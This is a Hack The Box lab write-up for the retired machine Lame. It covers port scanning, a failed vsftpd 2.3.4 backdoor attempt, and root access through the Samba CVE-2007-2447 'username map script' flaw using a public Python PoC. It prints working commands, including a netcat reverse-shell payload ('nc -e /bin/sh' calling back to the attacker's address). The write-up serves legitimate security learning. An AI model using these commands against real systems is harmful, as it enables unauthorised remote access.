---
title: Lame (Hack The Box) Full Write-Up
description: In this second Hack The Box write-up, I walk through Lame step by step, from enumeration to full compromise, with a stronger focus on manual exploitation.
date: 2026-03-31 12:01:35 +0300
image: 'images/posts/HTB-Lame-write-up.jpg'
tags: [write-up]
tags_color: '#df1b1b'
---
## Introduction:

Lame is the oldest retired Linux machine on the Hack The Box platform. It is rated easy and was originally released on March 14, 2017. In this walkthrough, I’ll use HTB’s Guided Mode to better understand the exploitation process step by step.

## Attack Path Summary

- Enumeration → Nmap reveals Samba 3.0.20
- Initial attempt → VSFTPD exploit (failed)
- Foothold → CVE-2007-2447 (Samba RCE)
- Privilege level → root access via exploit
***

`Target_IP`: 10.129.12.112

As always, the first step is to verify that the target host is reachable:


```css
ping Target_IP
```

```shell
PING 10.129.12.112 (10.129.12.112) 56(84) bytes of data.
64 bytes from 10.129.12.112: icmp_seq=1 ttl=63 time=81.6 ms
64 bytes from 10.129.12.112: icmp_seq=2 ttl=63 time=81.1 ms
64 bytes from 10.129.12.112: icmp_seq=3 ttl=63 time=81.1 ms
64 bytes from 10.129.12.112: icmp_seq=4 ttl=63 time=80.9 ms
^C
--- 10.129.12.112 ping statistics ---
5 packets transmitted, 4 received, 20% packet loss, time 4003ms
rtt min/avg/max/mdev = 80.901/81.180/81.643/0.277 ms

```

A successful response confirms that the host is alive and accessible on the network.

## Enumeration:

Running full port scan to avoid missing non-standard services.



```shell
sudo nmap -sS -sC -sV -p- -T4 --min-rate 10000 -oN nmap_initial.txt Target_IP
```

<div class="table-container">
  <table>
    <tr><th>Parameter</th><th>Purpose</th></tr>
    <tr><td>sudo</td><td>runs Nmap with elevated privileges (required for SYN scan -sS)</td></tr>
    <tr><td>-sS</td><td>TCP SYN (stealth) scan, faster and less detectable than a full TCP connect scan</tr>
    <tr><td>-sC</td><td>runs default NSE (Nmap Scripting Engine) scripts</td></tr>
    <tr><td>-sV</td><td>detects service versions running on open ports</td></tr>
    <tr><td>-p-</td><td>scans all 65,535 ports</td></tr>
    <tr><td>-T4</td><td>faster timing template (aggressive, but still stable)</td></tr>
    <tr><td>--min-rate 10000</td><td>forces Nmap to send at least 10,000 packets per second (aggressive scan speed)</td></tr>
    <tr><td>-oN nmap_initial.txt</td><td>saves output in normal format to file</td></tr>
  </table>
</div>


```shell
sudo nmap -sS -sC -sV -p- -T4 --min-rate 10000 -oN nmap_initial.txt 10.129.12.112
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-31 09:32 CDT
Nmap scan report for 10.129.12.112
Host is up (0.081s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.141
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-03-31T10:33:07-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m36s, deviation: 2h49m45s, median: 34s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.69 seconds

```
***

The scan revealed five open TCP ports:

* `21 (FTP)` → vsftpd 2.3.4 with anonymous login enabled (potential misconfiguration)
* `22 (SSH)` → OpenSSH 4.7p1 on Ubuntu (likely for remote access)
* `139/445 (SMB)` → Samba 3.0.20-Debian (file sharing, possible enumeration target)
* `3632 (distccd)` → distccd service exposed (potential remote code execution vector)

***
From the initial scan, FTP (anonymous access), SMB, and distccd stand out as the most promising attack vectors.

## Initial Exploitation Attempt (VSFTPD)

HTB guided mode indicates that VSFTPD version 2.3.4 contains a well-known backdoor that can be exploited using a Metasploit module. The next step is to verify this finding.

Before using Metasploit, let's verify this with Searchsploit. This helps confirm that the vulnerability is publicly known and provides alternative exploitation methods.

```shell
searchsploit vsftpd 2.3.4
```

```shell
earchsploit vsftpd 2.3.4
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The Searchsploit results confirm that VSFTPD version 2.3.4 is vulnerable to a backdoor command execution vulnerability:

* `49757.py` → Python exploit script  
* `17491.rb` → Metasploit module  

This confirms that the vulnerability is publicly known and can be exploited using different methods.

In this case, I will proceed with the Metasploit module, as it provides a faster and more reliable way to gain access.

Since Searchsploit confirmed the presence of a Metasploit module for VSFTPD 2.3.4, the next step is to test it with `msfconsole`.

First, start Metasploit:

```shell
msfconsole
```


```bash

       =[ metasploit v6.4.71-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 431 post       ]
+ -- --=[ 1669 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[msf](Jobs:0 Agents:0) >> Interrupt: use the 'exit' command to quit
[msf](Jobs:0 Agents:0) >> 
```

This launches the Metasploit Framework console, where we can search for and run available exploit modules.

Next, search for the VSFTPD 2.3.4 module:

```bash
search vsftpd 2.3.4
```
After searching for the module in Metasploit, the following result was returned:

```bash
[msf](Jobs:0 Agents:0) >> search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```

Metasploit returns an available module for VSFTPD 2.3.4:

* `exploit/unix/ftp/vsftpd_234_backdoor` (rank: excellent)

The presence of an "excellent" ranked module significantly increases the likelihood of successful exploitation. Next, I will load the module and attempt exploitation.

To load it, I run:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

```bash
[msf](Jobs:0 Agents:0) >> use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> 
```

This selects the exploit module targeting the well-known backdoor in VSFTPD 2.3.4.

Before running the exploit, I review the required settings:

```bash
show options
```
```bash
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[
                                       ,type:host:port][...]. Supported proxie
                                       s: socks4, socks5, sapni, socks5h, http
   RHOSTS                    yes       The target host(s), see https://docs.me
                                       tasploit.com/docs/using-metasploit/basi
                                       cs/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```



The most important parameter here is `RHOSTS`, which defines the target IP address.

Set the target host:

```bash
set RHOSTS 10.129.12.112
```

I can now run the exploit

```bash
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> run
[*] 10.129.12.112:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.12.112:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
The exploit attempt did not return a session.

Further research shows that the VSFTPD 2.3.4 backdoor was only present in a briefly compromised version of the source code distributed in 2011.

Since the exploit was unsuccessful I will follo up on HTB guide mode sugestion and focus on Samba.

## Foothold (Samba Exploitation)

HTB guided mode indicates that this version of Samba may be vulnerable to remote code execution. After further research, I identified CVE-2007-2447 as the vulnerability that matches these conditions.

To confirm this, I performed a quick search for available exploits:

```bash
 searchsploit samba 3.0.20
```

```bash
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Securi | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map scr | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow         | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The results show multiple potential exploits, including one targeting the "username map script" vulnerability, which aligns with CVE-2007-2447.

For learning and educational purposes, I decided not to use Metasploit this time, but instead to work with a publicly available PoC (Proof of Concept) from GitHub.

https://github.com/Ziemni/CVE-2007-2447-in-Python

First, I clone the repository:


```bash
git clone https://github.com/Ziemni/CVE-2007-2447-in-Python.git
cd CVE-2007-2447-in-Python
```
The repository contains two files: the exploit script and a README file. Let’s review the README to understand how the exploit works.

```bash
cat README.md 
# CVE-2007-2447 - Python implementation

## Description
Python implementation of 'Username' map script' RCE Exploit for Samba 3.0.20 < 3.0.25rc3 (CVE-2007-2447).

## Usage
`python3 smbExploit.py <IP> <PORT> <PAYLOAD>`
 - IP - Ip of the remote machine.
 - PORT - (Optional) Port that smb is running on.
 - PAYLOAD - Payload to be executed on the remote machine e.g. reverse shell.

Examples:

`python3 smbExploit.py 192.168.1.2 139 'nc -e /bin/sh 192.168.1.1 4444'`

`python3 smbExploit.py 192.168.1.2 'nc -e /bin/sh 192.168.1.1 4444'`

## Resorces
[CVE-2007-2447: Remote Command Injection Vulnerability](https://www.samba.org/samba/security/CVE-2007-2447.html)

[Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)](https://www.exploit-db.com/exploits/16320)
```
Referring to the earlier Searchsploit results, an exploit targeting the "username map script" vulnerability for Samba 3.0.20 < 3.0.25rc3 was identified.

This directly corresponds to CVE-2007-2447, confirming that the Python PoC leverages the same vulnerability.

As described in the README, the next step is to start a Netcat listener on port 4444 to receive the reverse shell, and then execute the PoC.

```bash
nc -lvnp 4444
```

* `-l` → listen for incoming connections
* `-v` → verbose mode (shows connection details)
* `-n` → skip DNS resolution (faster)
* `-p` 4444 → listen on port 4444
***

At this point, Netcat is listening on port 4444, waiting for an incoming reverse shell connection.

With the listener ready, I proceed to execute the PoC.

```bash
python3 smbExploit.py 10.129.12.112 445 'nc -e /bin/sh 10.10.15.141 4444'
```

When attempting to run the exploit, I encountered a missing dependency. The script returned the following error:

```bash
pysmb is not installed: python3 -m pip install pysmb
```
To resolve this, I install it using pip:

```shell
python3 -m pip install pysmb
Defaulting to user installation because normal site-packages is not writeable
Collecting pysmb
Downloading pysmb-1.2.13-py3-none-any.whl.metadata (1.6 kB)
Requirement already satisfied: pyasn1 in /usr/lib/python3/dist-packages (from pysmb) (0.4.8)
Requirement already satisfied: tqdm in /usr/local/lib/python3.11/dist-packages (from pysmb) (4.66.5)
Downloading pysmb-1.2.13-py3-none-any.whl (85 kB)
Installing collected packages: pysmb
Successfully installed pysmb-1.2.13
```
With the dependency installed, I attempt to run the exploit again.

```shell
python3 smbExploit.py 10.129.12.112 445 'nc -e /bin/sh 10.10.15.141 4444'
[*] Sending the payload
```

The exploit successfully returned a reverse shell, and I gained `root` access to the target system.

From the Netcat listener:

```bash
c -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.141] from (UNKNOWN) [10.129.12.112] 37018
whoami
root
```

## Post-Exploitation


With full system access confirmed, I proceed to look for the user flag.

```bash
cd makis
ls
user.txt
pwd
/home/makis
ls
user.txt
cat user.txt
****************************
```
The user flag is successfully obtained.

With full system access already obtained, I proceed to locate the root flag. Let's go back to the root directory.

```bash
cd root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
**********************
```
The root flag is successfully retrieved, completing the machine.

***

This was my first Hack The Box machine completed using guided mode, and it turned out to be a great learning experience.

While guided mode helped structure the process, I found the most value in manually verifying vulnerabilities and working with public PoCs instead of relying entirely on automated tools.

Moving forward, my goal is to focus more on understanding the underlying mechanics of exploits rather than just executing them.

### Key takeaways:

- Always validate findings instead of blindly trusting tools  
- Manual exploitation provides a deeper understanding than automated frameworks  
- Small troubleshooting steps (like missing dependencies) are part of the process  
- Understanding the vulnerability is more important than just getting a shell  

***
I hope you enjoyed this write-up. The next machine — Beep — will be covered soon, so stay tuned.




